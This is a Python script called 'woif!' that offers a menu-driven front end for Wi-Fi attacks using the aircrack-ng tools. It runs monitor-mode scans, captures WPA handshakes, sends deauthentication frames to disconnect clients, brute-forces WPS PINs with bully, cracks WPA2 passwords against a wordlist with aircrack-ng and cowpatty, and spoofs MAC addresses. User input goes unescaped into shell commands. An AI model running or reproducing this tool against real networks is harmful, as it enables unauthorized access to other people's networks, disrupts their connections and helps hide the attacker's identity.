#!/usr/bin/python3
import os
os.system("pip install pyfiglet termcolor colorama")
from colorama import init
from termcolor import cprint 
from pyfiglet import figlet_format

# header

cprint(figlet_format('woif!', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
print ("contact us : lordmahdi@gmail.com , @lordmmahdi    ,    MADE IN IRAN")


def menu_list():
    print ("    ")
    print ("menu list :")
    print ("    ")
    print ("[0]-> check interface for wireless and ethernet")
    print ("[1]-> wifi list")
    print ("[2]-> change interface mode to monitor")
    print ("[3]-> check wireless card for attack")
    print ("[4]-> check modem with wps in wifi list")
    print ("[5]-> get handshake")
    print ("[6]-> send death messeage")
    print ("[71]-> crack wifi with bully for wps")
    print ("[72]-> crack wifi with aircrack-ng for wpa2")
    print ("[73]-> crack wifi with cowpatty for wpa2")
    print ("[81]-> show current system mac address")
    print ("[82]-> change system mac address")
    print ("[9]-> exit")

# execute

menu_list()
print("dont scare you can find answers with number 0 and 1 :X")

while(True):
    print ("    ")
    selection = input("now what do you want to do ?")
    if selection == "0":
        os.system("gnome-terminal -x sh -c 'ifconfig;iwconfig; exec bash'")
    elif selection == "1":
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'airodump-ng {}; exec bash'".format(interface))
    elif selection == "2":
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'ifconfig {} down&&iwconfig {} mode monitor&&ifconfig {} up; exec bash'".format(interface,interface,interface))
    elif selection == "3":
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'aireplay-ng -9 {}; exec bash'".format(interface))
    elif selection == "4":
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'wash -i {}; exec bash'".format(interface))
    elif selection == "5":
        handshake_name = input("what is handshake name that you want to set ?")
        channel = input("what is wifi channel number ?")
        bssid = input("what is wifi bssid ?")
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'airodump-ng -w {} -c {} --bssid {} {}; exec bash'".format(handshake_name,channel,bssid,interface))
    elif selection == "6":
        bssid = input("what is wifi bssid ?")
        station = input("what is wifi station ?")
        interface = input("what is your interface ?")
        os.system("gnome-terminal -x sh -c 'aireplay-ng -0 3 -a {} -c {} {}; exec bash'".format(bssid,station,interface))
    elif selection == "71":
        interface = input("what is your interface ?")
        bssid = input("what is wifi bssid ?")
        os.system("gnome-terminal -x sh -c 'bully {} -b {} -d; exec bash'".format(interface,bssid))
    elif selection == "72":
        handshake_address = input("where is your handshake ?")
        passlist_address = input("where is your password list ?")
        os.system("gnome-terminal -x sh -c 'aircrack-ng {} -w {}; exec bash'".format(handshake_address,passlist_address))
    elif selection == "73":
        handshake_address = input("where is your handshake ?")
        passlist_address = input("where is your password list ?")
        ssid = input("what is wifi ssid ?")
        os.system("gnome-terminal -x sh -c 'cowpatty -f {} -r {} -s {}; exec bash'".format(passlist_address,handshake_address,ssid))
    elif selection == "81":
        network_adapter = input("what is your network adapter ?") 
        os.system("gnome-terminal -x sh -c 'macchanger -s {}; exec bash'".format(network_adapter))
    elif selection == "82":
        network_adapter = input("what is your network adapter ?") 
        os.system("gnome-terminal -x sh -c 'macchanger -m 00:11:22:33:44:55 {}; exec bash'".format(network_adapter))
    elif selection == "9":
        print ("    ")
        print ("good bye :)")
        break
    else:
        print("wrong number !!")
